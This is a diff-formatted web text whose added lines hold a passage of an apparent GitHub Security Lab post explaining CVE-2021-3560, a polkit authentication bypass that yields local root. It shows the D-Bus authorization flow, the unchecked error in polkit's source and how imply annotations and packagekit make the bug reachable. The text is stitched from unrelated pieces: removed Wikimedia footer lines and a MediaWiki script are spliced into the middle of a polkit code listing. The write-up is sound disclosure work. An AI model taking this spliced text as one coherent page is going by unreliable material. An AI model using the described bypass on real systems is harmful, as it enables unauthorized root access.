+<p class="has-image"><img loading="lazy" src="https://github.blog/wp-content/uploads/2021/06/polkit-diagram-cropped.png?w=1024&#038;resize=1024%2C552" alt='Diagram showing five processes involved in dbus-send command: "d-bus send" and "authentication agent" above the line, and "accounts-daemon" and "polkit" below the line, with dbus-daemon serving as the go-between' width="1024" height="552" class="alignleft size-large wp-image-58614" srcset="https://github.blog/wp-content/uploads/2021/06/polkit-diagram-cropped.png?w=1046 1046w, https://github.blog/wp-content/uploads/2021/06/polkit-diagram-cropped.png?w=300 300w, https://github.blog/wp-content/uploads/2021/06/polkit-diagram-cropped.png?w=768 768w, https://github.blog/wp-content/uploads/2021/06/polkit-diagram-cropped.png?w=1024&#038;resize=1024%2C552 1024w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></p>
+<p>The two processes above the dashed line&mdash;<code>dbus-send</code> and the authentication agent&mdash;are unprivileged user processes. Those below the line are privileged system processes. In the center is <code>dbus-daemon</code>, which handles all of the communication: the other four processes communicate with each other by sending D-Bus messages.</p>
+<p><code>dbus-daemon</code> plays a very important role in the security of polkit, because it enables the four processes to communicate securely and check each other&rsquo;s credentials. For example, when the authentication agent sends an authentication cookie to polkit, it does so by sending it to the <code>org.freedesktop.PolicyKit1</code> D-Bus address. Since that address is only allowed to be registered by a root process, there is no risk of an unprivileged process intercepting messages. <code>dbus-daemon</code> also assigns every connection a &ldquo;unique bus name:&rdquo; typically something like &ldquo;:1.96&rdquo;. It&rsquo;s a bit like a process identifier (PID), except without being vulnerable to <a href="https://securitylab.github.com/research/ubuntu-apport-CVE-2019-15790/" rel="noopener" target="_blank">PID recycling attacks</a>. Unique bus names are currently chosen from a 64-bit range, so there&rsquo;s no risk of a vulnerability caused by a name being reused.</p>
+<p>This is the sequence of events:</p>
+<ol>
+<li><code>dbus-send</code> asks <code>accounts-daemon</code> to create a new user.</li>
+<li><code>accounts-daemon</code> receives the D-Bus message from <code>dbus-send</code>. The message includes the unique bus name of the sender. Let&rsquo;s assume it&rsquo;s &ldquo;:1.96&rdquo;. This name is attached to the message by <code>dbus-daemon</code> and cannot be forged.</li>
+<li><code>accounts-daemon</code> asks polkit if connection :1.96 is authorized to create a new user.</li>
+<li>polkit asks <code>dbus-daemon</code> for the UID of connection :1.96.</li>
+<li>
+If the UID of connection :1.96 is &ldquo;0,&rdquo; then polkit immediately authorizes the request. Otherwise, it sends the authentication agent a list of administrator users who are allowed to authorize the request.</li>
+<li>The authentication agent opens a dialog box to get the password from the user.</li>
+<li>The authentication agent sends the password to polkit.</li>
+<li>polkit sends a &ldquo;yes&rdquo; reply back to <code>accounts-daemon</code>.</li>
+<li><code>accounts-daemon</code> creates the new user account.</li>
+</ol>
+<h2>The <a id="vulnerability">vulnerability</a></h2>
+<p>Why does killing the <code>dbus-send</code> command cause an authentication bypass? The vulnerability is in step four of the sequence of events listed above. What happens if polkit asks <code>dbus-daemon</code> for the UID of connection :1.96, but connection :1.96 no longer exists? <code>dbus-daemon</code> handles that situation correctly and returns an error. But it turns out that polkit does not handle that error correctly. In fact, polkit mishandles the error in a particularly unfortunate way: rather than rejecting the request, it treats the request as though it came from a process with UID 0. In other words, it immediately authorizes the request because it thinks the request has come from a root process.</p>
+<p>Why is the timing of the vulnerability non-deterministic? It turns out that polkit asks <code>dbus-daemon</code> for the UID of the requesting process multiple times, on different codepaths. Most of those codepaths handle the error correctly, but one of them doesn&rsquo;t. If you kill the <code>dbus-send</code> command early, it&rsquo;s handled by one of the correct codepaths and the request is rejected. To trigger the vulnerable codepath, you have to disconnect at just the right moment. And because there are multiple processes involved, the timing of that &ldquo;right moment&rdquo; varies from one run to the next. That&rsquo;s why it usually takes a few tries for the exploit to succeed. I&rsquo;d guess it&rsquo;s also the reason why the bug wasn&rsquo;t previously discovered. If you could trigger the vulnerability by killing the <code>dbus-send</code> command immediately, then I expect it would have been discovered a long time ago, because that&rsquo;s a much more obvious thing to test for.</p>
+<p>The function which asks <code>dbus-daemon</code> for the UID of the requesting connection is named <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/bfa5036bfb93582c5a87c44b847957479d911e38/src/polkit/polkitsystembusname.c#L388" rel="noopener" target="_blank"><code>polkit_system_bus_name_get_creds_sync</code></a>:</p>
+<pre>static gboolean
+polkit_system_bus_name_get_creds_sync (
+PolkitSystemBusName           *system_bus_name,
+    guint32                       *out_uid,
+    guint32                       *out_pid,
+    GCancellable                  *cancellable,
+    GError                       **error)</pre>
+<p>The behavior of <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkit/polkitsystembusname.c#L388" rel="noopener" target="_blank"><code>polkit_system_bus_name_get_creds_sync</code></a> is strange, because when an error occurs, the function sets the error parameter but still returns <code>TRUE</code>. It wasn&rsquo;t clear to me, when I wrote my <a href="https://gitlab.freedesktop.org/polkit/polkit/-/issues/140" rel="noopener" target="_blank">bug report</a>, whether that was a bug or a deliberate design choice. (It turns out that it was a bug, because the polkit developers have <a href="https://gitlab.freedesktop.org/polkit/polkit/-/commit/a04d13affe0fa53ff618e07aa8f57f4c0e3b9b81" rel="noopener" target="_blank">fixed the vulnerability</a> by returning <code>FALSE</code> on error.) My uncertainty arose from the fact that <em>almost all</em> the callers of <code>polkit_system_bus_name_get_creds_sync</code> don&rsquo;t just check the Boolean result, but also check that the error value is still <code>NULL</code> before proceeding. The cause of the vulnerability was that the error value wasn&rsquo;t checked in the following stack trace:</p>
+<pre>0 in polkit_system_bus_name_get_creds_sync of <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkit/polkitsystembusname.c#L388" rel="noopener" target="_blank">polkitsystembusname.c:388</a>
+1 in polkit_system_bus_name_get_user_sync of <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkit/polkitsystembusname.c#L511" rel="noopener" target="_blank">polkitsystembusname.c:511</a>
+2 in polkit_backend_session_monitor_get_user_for_subject of <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkitbackend/polkitbackendsessionmonitor-systemd.c#L303" rel="noopener" target="_blank">polkitbackendsessionmonitor-systemd.c:303</a>
+3 in check_authorization_sync of <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkitbackend/polkitbackendinteractiveauthority.c#L1121" rel="noopener" target="_blank">polkitbackendinteractiveauthority.c:1121</a>
+4 in check_authorization_sync of <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkitbackend/polkitbackendinteractiveauthority.c#L1227" rel="noopener" target="_blank">polkitbackendinteractiveauthority.c:1227</a>
+5 in polkit_backend_interactive_authority_check_authorization of <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkitbackend/polkitbackendinteractiveauthority.c#L981" rel="noopener" target="_blank">polkitbackendinteractiveauthority.c:981</a>
+6 in polkit_backend_authority_check_authorization of <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkitbackend/polkitbackendauthority.c#L227" rel="noopener" target="_blank">polkitbackendauthority.c:227</a>
+7 in server_handle_check_authorization of <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkitbackend/polkitbackendauthority.c#L790" rel="noopener" target="_blank">polkitbackendauthority.c:790</a>
+7 in server_handle_method_call of <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkitbackend/polkitbackendauthority.c#L1272" rel="noopener" target="_blank">polkitbackendauthority.c:1272</a></pre>
+<p>The bug is in this snippet of code in <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkitbackend/polkitbackendinteractiveauthority.c#L1121" rel="noopener" target="_blank"><code>check_authorization_sync</code></a>:</p>
+<pre>/* every subject has a user; this is supplied by the client, so we rely
+ * on the caller to validate its acceptability. */
+user_of_subject = polkit_backend_session_monitor_get_user_for_subject (priv-&gt;session_monitor,
+                                                                       subject, NULL,
+                                                                       error);
+if (user_of_subject == NULL)
+    goto out;
 
-	<ul id="footer-icons" class="noprint">
-	<li id="footer-copyrightico"><a href="https://wikimediafoundation.org/"><img src="/static/images/footer/wikimedia-button.png" srcset="/static/images/footer/wikimedia-button-1.5x.png 1.5x, /static/images/footer/wikimedia-button-2x.png 2x" width="88" height="31" alt="Wikimedia Foundation" loading="lazy" /></a></li>
-	<li id="footer-poweredbyico"><a href="https://www.mediawiki.org/"><img src="/static/images/footer/poweredby_mediawiki_88x31.png" alt="Powered by MediaWiki" srcset="/static/images/footer/poweredby_mediawiki_132x47.png 1.5x, /static/images/footer/poweredby_mediawiki_176x62.png 2x" width="88" height="31" loading="lazy"/></a></li>
-</ul>
+/* special case: uid 0, root, is _always_ authorized for anything */
+if (POLKIT_IS_UNIX_USER (user_of_subject) &amp;&amp; polkit_unix_user_get_uid (POLKIT_UNIX_USER (user_of_subject)) == 0)
+  {
+    result = polkit_authorization_result_new (TRUE, FALSE, NULL);
+    goto out;
+  }</pre>
+<p>Notice that the value of <code>error</code> is not checked.</p>
+<h2><code>org.freedesktop.policykit.imply</code> <a id="annotations">annotations</a></h2>
+<p>I mentioned earlier that my PoC depends on <code>gnome-control-center</code> being installed, in addition to <code>accountsservice</code>. Why is that? The PoC doesn&rsquo;t use <code>gnome-control-center</code> in any visible way, and I didn&rsquo;t even realize that I was depending on it when I wrote the PoC! In fact, I only found out because the Red Hat security team couldn&rsquo;t reproduce my PoC on RHEL. When I tried it for myself on a RHEL 8.4 VM, I also found that the PoC didn&rsquo;t work. That was puzzling, because it was working beautifully on Fedora 32 and CentOS Stream. The crucial difference, it turned out, was that my RHEL VM was a non-graphical server with no GNOME installed. So why does that matter? The answer is <code>policykit.imply</code> annotations.</p>
+<p>Some polkit actions are essentially equivalent to each other, so if one has already been authorized then it makes sense to silently authorize the other. The GNOME settings dialog is a good example:</p>
+<p class="has-image"><img loading="lazy" src="https://github.blog/wp-content/uploads/2021/06/polkit-fig-6.png?w=1024&#038;resize=1024%2C743" alt="Screenshot of GNOME settings dialog" width="1024" height="743" class="alignleft size-large wp-image-58609" srcset="https://github.blog/wp-content/uploads/2021/06/polkit-fig-6.png?w=1600 1600w, https://github.blog/wp-content/uploads/2021/06/polkit-fig-6.png?w=300 300w, https://github.blog/wp-content/uploads/2021/06/polkit-fig-6.png?w=768 768w, https://github.blog/wp-content/uploads/2021/06/polkit-fig-6.png?w=1024&#038;resize=1024%2C743 1024w, https://github.blog/wp-content/uploads/2021/06/polkit-fig-6.png?w=1536 1536w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></p>
+<p>After you&rsquo;ve clicked the &ldquo;Unlock&rdquo; button and entered your password, you can do things like adding a new user account without having to authenticate a second time. That&rsquo;s handled by a <code>policykit.imply</code> annotation, which is defined in this <a href="https://gitlab.gnome.org/GNOME/gnome-control-center/-/blob/54eb734eaaa95807dd805fbe4e4ad0dceb787736/panels/user-accounts/org.gnome.controlcenter.user-accounts.policy.in" rel="noopener" target="_blank">config file</a>:</p>
+<pre>/usr/share/polkit-1/actions/org.gnome.controlcenter.user-accounts.policy</pre>
+<p>The config file contains the following implication:</p>
+<p class="has-image"><img loading="lazy" src="https://github.blog/wp-content/uploads/2021/06/polkit_config-file-implication.png?w=1024&#038;resize=1024%2C318" alt="" width="1024" height="318" class="alignleft size-large wp-image-58612" srcset="https://github.blog/wp-content/uploads/2021/06/polkit_config-file-implication.png?w=1041 1041w, https://github.blog/wp-content/uploads/2021/06/polkit_config-file-implication.png?w=300 300w, https://github.blog/wp-content/uploads/2021/06/polkit_config-file-implication.png?w=768 768w, https://github.blog/wp-content/uploads/2021/06/polkit_config-file-implication.png?w=1024&#038;resize=1024%2C318 1024w" sizes="(max-width: 1000px) 100vw, 1000px" data-recalc-dims="1"></p>
+<p>In other words, if you&rsquo;re authorized to perform <code>controlcenter</code> admin actions, then you&rsquo;re also authorized to perform <code>accountsservice</code> admin actions.</p>
+<p>When I attached <a href="https://www.gnu.org/software/gdb/" rel="noopener" target="_blank">GDB</a> to polkit on my RHEL VM, I found that I wasn&rsquo;t seeing the vulnerable stack trace that I listed earlier. Notice that step four of the stack trace is a recursive call from <code>check_authorization_sync</code> to itself. That happens on <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkitbackend/polkitbackendinteractiveauthority.c#L1227" rel="noopener" target="_blank">line 1227</a>, which is where polkit checks the <code>policykit.imply</code> annotations:</p>
+<pre>PolkitAuthorizationResult *implied_result = NULL;
+PolkitImplicitAuthorization implied_implicit_authorization;
+GError *implied_error = NULL;
+const gchar *imply_action_id;
 
-</footer>
+imply_action_id = polkit_action_description_get_action_id (imply_ad);
 
-<script>(RLQ=window.RLQ||[]).push(function(){mw.config.set({"wgPageParseReport":{"limitreport":{"cputime":"0.041","walltime":"0.058","ppvisitednodes":{"value":311,"limit":1000000},"postexpandincludesize":{"value":29112,"limit":2097152},"templateargumentsize":{"value":289,"limit":2097152},"expansiondepth":{"value":14,"limit":100},"expensivefunctioncount":{"value":5,"limit":500},"unstrip-depth":{"value":0,"limit":20},"unstrip-size":{"value":22346,"limit":5000000},"timingprofile":["100.00%   53.708      1 Template:Lp-layout-default","100.00%   53.708      1 -total"," 90.76%   48.748      1 Template:GeolocateError"," 24.12%   12.956      1 Template:2012FR/Lp-header/Socialmedia"," 18.13%    9.737      1 Template:AppealAmountSwitch"," 17.23%    9.255      1 Template:2012FR/Switch/Appeal"," 12.57%    6.753      1 Template:AppealAmountSwitch/en"," 12.51%    6.721      2 Template:IncludeCSS","  8.51%    4.569      2 Template:Styles/Default.css","  0.18%    0.098      1 Template:2011FR/Appeal-default/title/en"]},"scribunto":{"limitreport-timeusage":{"value":"0.013","limit":"10.000"},"limitreport-memusage":{"value":492284,"limit":52428800}},"cachereport":{"origin":"mw1416","timestamp":"20220505183746","ttl":1814400,"transientcontent":false}}});mw.config.set({"wgBackendResponseTime":114,"wgHostname":"mw1416"});});</script>
+/* g_debug ("%s is implied by %s, checking", action_id, imply_action_id); */
+implied_result = check_authorization_sync (authority, caller, subject,
+                                           imply_action_id,
+                                           details, flags,
+                                           &amp;implied_implicit_authorization, TRUE,
+                                           &amp;implied_error);
+if (implied_result != NULL)
+  {
+    if (polkit_authorization_result_get_is_authorized (implied_result))
+      {
+        g_debug (" is authorized (implied by %s)", imply_action_id);
+        result = implied_result;
+        /* cleanup */
+        g_strfreev (tokens);
+        goto out;
+      }
+    g_object_unref (implied_result);
+  }
+if (implied_error != NULL)
+  g_error_free (implied_error);</pre>
+<p>The authentication bypass depends on the error value getting ignored. It was ignored on <a href="https://gitlab.freedesktop.org/polkit/polkit/-/blob/ff4c2144f0fb1325275887d9e254117fcd8a1b52/src/polkitbackend/polkitbackendinteractiveauthority.c#L1121" rel="noopener" target="_blank">line 1121</a>, but it&rsquo;s still stored in the <code>error</code> parameter, so it also needs to be ignored by the caller. The block of code above has a temporary variable named <code>implied_error</code>, which is ignored when <code>implied_result</code> isn&rsquo;t null. That&rsquo;s the crucial step that makes the bypass possible.</p>
+<p>To sum up, the authentication bypass only works on polkit actions that are implied by another polkit action. That&rsquo;s why my PoC only works if gnome-<code>control-center</code> is installed: it adds the <code>policykit.imply</code> annotation that enables me to target <code>accountsservice</code>. That does not mean that RHEL is safe from this vulnerability, though. Another attack vector for the vulnerability is <a href="https://packagekit.freedesktop.org/" rel="noopener" target="_blank"><code>packagekit</code></a>, which is installed by default on RHEL and has a suitable <code>policykit.imply</code> annotation for the <code>package-install</code> action. <code>packagekit</code> is used to install packages, so it can be exploited to install <code>gnome-control-center</code>, after which the rest of the exploit works as before.</p>
+<h2><a id="conclusion">Conclusion</a></h2>
+<p>CVE-2021-3560 enables an unprivileged local attacker to gain root privileges. It&rsquo;s very simple and quick to exploit, so it&rsquo;s important that you update your Linux installations as soon as possible. Any system that has polkit version 0.113 (or later) installed is vulnerable. That includes popular distributions such as RHEL 8 and Ubuntu 20.04.</p>
+<p>And if you like nerding out about security vulnerabilities (and how to fix them) check out some of the other work that the <a href="https://securitylab.github.com/" rel="noopener" target="_blank">Security Lab</a> team is doing or follow us on <a href="https://twitter.com/GHSecurityLab" rel="noopener" target="_blank">Twitter</a>.</p>
+</body></html>
+      <div class="post-tags text-mono f4-mktg mt-8">
+      <div class="d-flex flex-nowrap flex-items-start">
+        <span class="post-tags-label flex-shrink-0">Tags:</span> <ul class="d-inline-block list-style-none color-text-link"><li class="d-inline-block"><a href="https://github.blog/tag/github-security-lab/" rel="tag">GitHub Security Lab</a></li></ul>      </div>
+    </div>
+  </main>
+
+<div class="col-12 col-md-4 col-lg-3 post__sidebar">
+
+	<aside class="mb-7 mb-md-8 mt-7 mt-md-0"><h2 class="pt-1 table-of-contents-heading color-text-secondary mb-0">More on <a href="https://github.blog/tag/github-security-lab/" class="Link--primary text-bold">GitHub Security Lab</a></h2><article class="py-4 d-flex flex-column"><a href="https://github.blog/2022-04-22-removing-the-stigma-of-a-cve/" class="d-block col-12 position-relative rounded-2 mb-3 overflow-hidden tease-thumbnail"><svg aria-hidden="true" width="395" height="210" class="width-full height-auto d-block" style="visibility: hidden; pointer-events: none;"></svg><img srcset="https://github.blog/wp-content/uploads/2022/04/Engineering-Security@2x.png?resize=288%2C179 288w,https://github.blog/wp-content/uploads/2022/04/Engineering-Security@2x.png?resize=512%2C318 512w,https://github.blog/wp-content/uploads/2022/04/Engineering-Security@2x.png?resize=708%2C440 708w" src="https://github.blog/wp-content/uploads/2022/04/Engineering-Security@2x.png?resize=512%2C318" width="512" height="318" alt="Removing the stigma of a CVE" class="d-block width-full height-auto rounded-2 tease-thumbnail__img cover-image" loading="lazy" decoding="async" /></a><div class="col-12  tease-text"><h3 class="h6-mktg mb-12px"><a href="https://github.blog/2022-04-22-removing-the-stigma-of-a-cve/" class="Link--primary">Removing the stigma of a CVE</a></h3><p class="f4-mktg color-text-secondary mb-0">Do you worry that a CVE will hurt the reputation of your project? In reality, CVEs are a tracking number, and nothing more. Here's how we think of them at GitHub.</p><div class="mt-14px">
+ 		<div class="d-flex flex-items-center">
+ 			
+ 			<div class="d-flex flex-items-end flex-wrap" style="margin-top: -4px;">
+ 				<a class="d-inline-block Link--primary f5-mktg text-bold mt-1 mr-12px" href="https://github.blog/author/taladrane/" title="Madison Oliver">Madison Oliver</a>
+ 				
+ 			</div>
+ 		</div></div></div></article><article class="py-4 d-flex flex-column border-top"><div class="col-12  tease-text"><h3 class="h6-mktg mb-12px"><a href="https://github.blog/2022-03-21-validate-all-things-input-validation/" class="Link--primary">Validate all the things: improve your security with input validation!</a></h3><p class="f4-mktg color-text-secondary mb-0">If there's one habit that can make software more secure, it's probably input validation. Here's how to apply OWASP Proactive Control C5 (Validate All Inputs) to your code. </p><div class="mt-14px">
+ 		<div class="d-flex flex-items-center">
+ 			
+ 			<div class="d-flex flex-items-end flex-wrap" style="margin-top: -4px;">
+ 				<a class="d-inline-block Link--primary f5-mktg text-bold mt-1 mr-12px" href="https://github.blog/author/jarlob/" title="Jaroslav Lobacevski">Jaroslav Lobacevski</a>
+ 				
+ 			</div>
+ 		</div></div></div></article><article class="py-4 d-flex flex-column border-top"><div class="col-12  tease-text"><h3 class="h6-mktg mb-12px"><a href="https://github.blog/2022-02-16-encoding-escaping-untrusted-data-prevent-injection-attacks/" class="Link--primary">Encoding and escaping untrusted data to prevent injection attacks</a></h3><p class="f4-mktg color-text-secondary mb-0">Practical tips on how to apply OWASP Top 10 Proactive Control C4.</p><div class="mt-14px">
+ 		<div class="d-flex flex-items-center">
+ 			
+ 			<div class="d-flex flex-items-end flex-wrap" style="margin-top: -4px;">
+ 				<a class="d-inline-block Link--primary f5-mktg text-bold mt-1 mr-12px" href="https://github.blog/author/misfir3/" title="Jason White">Jason White</a>
+ 				
+ 			</div>
+ 		</div></div></div></article></aside>
+</div>
+  </div>
+</div>
+
+  <section class="related-posts container-xl mx-auto p-responsive">
+    <h2 class="h5-mktg border-bottom pb-3 mb-lg-3" style="border-width: 2px !important;">
+      Related posts    </h2>
+    <div class="d-flex flex-wrap gutter-spacious">
+      <article id="term-post-64715" class="col-12 col-lg-4 post-64715 post type-post status-publish format-standard has-post-thumbnail hentry category-product category-security tag-2fa tag-npm tag-security">
+  <div class="py-4 d-flex flex-column border-top">
+  	<a href="https://github.blog/2022-05-04-software-security-starts-with-the-developer-securing-developer-accounts-with-2fa/" class="d-block col-12 position-relative rounded-2 mb-3 overflow-hidden tease-thumbnail">
+      <svg aria-hidden="true" width="395" height="210" class="width-full height-auto d-block" style="visibility: hidden; pointer-events: none;"></svg>
+      <img srcset="https://github.blog/wp-content/uploads/2022/05/Security-Product@2x.png?resize=288%2C179 288w,https://github.blog/wp-content/uploads/2022/05/Security-Product@2x.png?resize=512%2C318 512w,https://github.blog/wp-content/uploads/2022/05/Security-Product@2x.png?resize=708%2C440 708w,https://github.blog/wp-content/uploads/2022/05/Security-Product@2x.png?resize=932%2C579 932w,https://github.blog/wp-content/uploads/2022/05/Security-Product@2x.png?resize=1024%2C636 1024w" src="https://github.blog/wp-content/uploads/2022/05/Security-Product@2x.png?resize=512%2C318" width="512" height="318" alt="Software security starts with the developer: Securing developer accounts with 2FA" class="d-block width-full height-auto rounded-2 tease-thumbnail__img cover-image" loading="lazy" decoding="async" />  	</a>
+
+    
+		<div class="mb-1">
+			<a href="https://github.blog/category/product/" class="f5-mktg text-gradient-purple-coral text-bold pb-1">Product</a>
+		</div><h3 class="h6-mktg mb-12px"><a class="Link--primary" href="https://github.blog/2022-05-04-software-security-starts-with-the-developer-securing-developer-accounts-with-2fa/">Software security starts with the developer: Securing developer accounts with 2FA</a></h3><p class="f4-mktg color-text-secondary mb-0">GitHub will require all users who contribute code on GitHub.com to enable one or more forms of two-factor authentication (2FA) by the end of 2023.</p>
+    <div class="mt-14px">
+      
+ 		<div class="d-flex flex-items-center">
+ 			
+ 			<div class="d-flex flex-items-end flex-wrap" style="margin-top: -4px;">
+ 				<a class="d-inline-block Link--primary f5-mktg text-bold mt-1 mr-12px" href="https://github.blog/author/mph4/" title="Mike Hanley">Mike Hanley</a>
+ 				
+ 			</div>
+ 		</div>    </div>
+  </div>
+</article>
+<article id="term-post-64550" class="col-12 col-lg-4 post-64550 post type-post status-publish format-standard has-post-thumbnail hentry category-product category-security tag-security tag-supply-chain-security">
+  <div class="py-4 d-flex flex-column border-top">
+  	<a href="https://github.blog/2022-04-28-best-practices-to-keep-your-projects-secure-on-github/" class="d-block col-12 position-relative rounded-2 mb-3 overflow-hidden tease-thumbnail">
+      <svg aria-hidden="true" width="395" height="210" class="width-full height-auto d-block" style="visibility: hidden; pointer-events: none;"></svg>
+      <img srcset="https://github.blog/wp-content/uploads/2022/04/Security-Product@2x-1.png?resize=288%2C179 288w,https://github.blog/wp-content/uploads/2022/04/Security-Product@2x-1.png?resize=512%2C318 512w,https://github.blog/wp-content/uploads/2022/04/Security-Product@2x-1.png?resize=708%2C440 708w,https://github.blog/wp-content/uploads/2022/04/Security-Product@2x-1.png?resize=932%2C579 932w,https://github.blog/wp-content/uploads/2022/04/Security-Product@2x-1.png?resize=1024%2C636 1024w" src="https://github.blog/wp-content/uploads/2022/04/Security-Product@2x-1.png?resize=512%2C318" width="512" height="318" alt="Best practices to keep your projects secure on GitHub" class="d-block width-full height-auto rounded-2 tease-thumbnail__img cover-image" loading="lazy" decoding="async" />  	</a>
+
+    
+		<div class="mb-1">
+			<a href="https://github.blog/category/product/" class="f5-mktg text-gradient-purple-coral text-bold pb-1">Product</a>
+		</div><h3 class="h6-mktg mb-12px"><a class="Link--primary" href="https://github.blog/2022-04-28-best-practices-to-keep-your-projects-secure-on-github/">Best practices to keep your projects secure on GitHub</a></h3><p class="f4-mktg color-text-secondary mb-0">These days software is subject to an ever-changing threat landscape. Check out the many ways you can keep your projects secure on GitHub today.</p>
+    <div class="mt-14px">
+      
+ 		<div class="d-flex flex-items-center">
+ 			
+ 			<div class="d-flex flex-items-end flex-wrap" style="margin-top: -4px;">
+ 				<a class="d-inline-block Link--primary f5-mktg text-bold mt-1 mr-12px" href="https://github.blog/author/jhutchings1/" title="Justin Hutchings">Justin Hutchings</a>
+ 				
+ 			</div>
+ 		</div>    </div>
+  </div>
+</article>
+<article id="term-post-64375" class="col-12 col-lg-4 post-64375 post type-post status-publish format-standard has-post-thumbnail hentry category-security tag-github-security-lab">
+  <div class="py-4 d-flex flex-column border-top">
+  	<a href="https://github.blog/2022-04-22-removing-the-stigma-of-a-cve/" class="d-block col-12 position-relative rounded-2 mb-3 overflow-hidden tease-thumbnail">
+      <svg aria-hidden="true" width="395" height="210" class="width-full height-auto d-block" style="visibility: hidden; pointer-events: none;"></svg>
+      <img srcset="https://github.blog/wp-content/uploads/2022/04/Engineering-Security@2x.png?resize=288%2C179 288w,https://github.blog/wp-content/uploads/2022/04/Engineering-Security@2x.png?resize=512%2C318 512w,https://github.blog/wp-content/uploads/2022/04/Engineering-Security@2x.png?resize=708%2C440 708w,https://github.blog/wp-content/uploads/2022/04/Engineering-Security@2x.png?resize=932%2C579 932w,https://github.blog/wp-content/uploads/2022/04/Engineering-Security@2x.png?resize=1024%2C636 1024w" src="https://github.blog/wp-content/uploads/2022/04/Engineering-Security@2x.png?resize=512%2C318" width="512" height="318" alt="Removing the stigma of a CVE" class="d-block width-full height-auto rounded-2 tease-thumbnail__img cover-image" loading="lazy" decoding="async" />  	</a>
+
+    
+		<div class="mb-1">
+			<a href="https://github.blog/category/security/" class="f5-mktg text-gradient-purple-coral text-bold pb-1">Security</a>
+		</div><h3 class="h6-mktg mb-12px"><a class="Link--primary" href="https://github.blog/2022-04-22-removing-the-stigma-of-a-cve/">Removing the stigma of a CVE</a></h3><p class="f4-mktg color-text-secondary mb-0">Do you worry that a CVE will hurt the reputation of your project? In reality, CVEs are a tracking number, and nothing more. Here's how we think of them at GitHub.</p>
+    <div class="mt-14px">
+      
+ 		<div class="d-flex flex-items-center">
+ 			
+ 			<div class="d-flex flex-items-end flex-wrap" style="margin-top: -4px;">
+ 				<a class="d-inline-block Link--primary f5-mktg text-bold mt-1 mr-12px" href="https://github.blog/author/taladrane/" title="Madison Oliver">Madison Oliver</a>
+ 				
+ 			</div>
+ 		</div>    </div>
+  </div>
+</article>
+    </div>
+  </section>
+</div>
+<div data-color-mode="dark" data-light-theme="light" data-dark-theme="dark">
+	<footer class="footer mt-6">
+
+		
+<div class="container-xl p-responsive">
+	<div class="d-flex flex-wrap py-5 mb-5">
+
+		<div class="col-12 col-lg-4 mb-5">
+			<a href="https://github.com/" data-ga-click="Resources, go to home, resources footer" class="color-text-primary" aria-label="Go to GitHub homepage">
+				<svg height="30" class="octicon octicon-logo-github" viewBox="0 0 45 16" version="1.1" width="84" aria-hidden="true">
+					<path fill-rule="evenodd" d="M18.53 12.03h-.02c.009 0 .015.01.024.011h.006l-.01-.01zm.004.011c-.093.001-.327.05-.574.05-.78 0-1.05-.36-1.05-.83V8.13h1.59c.09 0 .16-.08.16-.19v-1.7c0-.09-.08-.17-.16-.17h-1.59V3.96c0-.08-.05-.13-.14-.13h-2.16c-.09 0-.14.05-.14.13v2.17s-1.09.27-1.16.28c-.08.02-.13.09-.13.17v1.36c0 .11.08.19.17.19h1.11v3.28c0 2.44 1.7 2.69 2.86 2.69.53 0 1.17-.17 1.27-.22.06-.02.09-.09.09-.16v-1.5a.177.177 0 00-.146-.18zM42.23 9.84c0-1.81-.73-2.05-1.5-1.97-.6.04-1.08.34-1.08.34v3.52s.49.34 1.22.36c1.03.03 1.36-.34 1.36-2.25zm2.43-.16c0 3.43-1.11 4.41-3.05 4.41-1.64 0-2.52-.83-2.52-.83s-.04.46-.09.52c-.03.06-.08.08-.14.08h-1.48c-.1 0-.19-.08-.19-.17l.02-11.11c0-.09.08-.17.17-.17h2.13c.09 0 .17.08.17.17v3.77s.82-.53 2.02-.53l-.01-.02c1.2 0 2.97.45 2.97 3.88zm-8.72-3.61h-2.1c-.11 0-.17.08-.17.19v5.44s-.55.39-1.3.39-.97-.34-.97-1.09V6.25c0-.09-.08-.17-.17-.17h-2.14c-.09 0-.17.08-.17.17v5.11c0 2.2 1.23 2.75 2.92 2.75 1.39 0 2.52-.77 2.52-.77s.05.39.08.45c.02.05.09.09.16.09h1.34c.11 0 .17-.08.17-.17l.02-7.47c0-.09-.08-.17-.19-.17zm-23.7-.01h-2.13c-.09 0-.17.09-.17.2v7.34c0 .2.13.27.3.27h1.92c.2 0 .25-.09.25-.27V6.23c0-.09-.08-.17-.17-.17zm-1.05-3.38c-.77 0-1.38.61-1.38 1.38 0 .77.61 1.38 1.38 1.38.75 0 1.36-.61 1.36-1.38 0-.77-.61-1.38-1.36-1.38zm16.49-.25h-2.11c-.09 0-.17.08-.17.17v4.09h-3.31V2.6c0-.09-.08-.17-.17-.17h-2.13c-.09 0-.17.08-.17.17v11.11c0 .09.09.17.17.17h2.13c.09 0 .17-.08.17-.17V8.96h3.31l-.02 4.75c0 .09.08.17.17.17h2.13c.09 0 .17-.08.17-.17V2.6c0-.09-.08-.17-.17-.17zM8.81 7.35v5.74c0 .04-.01.11-.06.13 0 0-1.25.89-3.31.89-2.49 0-5.44-.78-5.44-5.92S2.58 1.99 5.1 